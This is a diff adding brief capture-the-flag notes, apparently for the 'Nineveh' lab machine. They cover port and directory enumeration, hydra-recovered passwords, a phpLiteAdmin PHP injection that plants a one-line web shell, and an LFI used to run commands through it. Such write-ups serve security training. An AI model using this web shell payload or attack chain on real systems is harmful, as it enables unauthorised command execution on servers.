@@ -1,0 +1,11 @@
+Step 1 (Enumeration)
+- nmap shows port 80,443 open.
+- add nineveh.htb to /etc/hosts to bypass port 443 security.
+- dirbuster shows /db/ on port 443 and gobuster shows /department/ on port 80.
+- hydra shows the password for 80 is '1q2w3e4r5t' and port 443 is 'password123'.
+- port 443 is running 'phpliteadmin' which is vulnerable to remote php code injection.
+- inject php oneliner into sql field '<?php echo system($_REQUEST["here"]); ?>'
+
+Step 2 (Foothold)
+- on port 80 /department/ notes directory is vulnearble to LFI.
+- navigate to injected php directory and add at the end '&here=ls' for command execution.
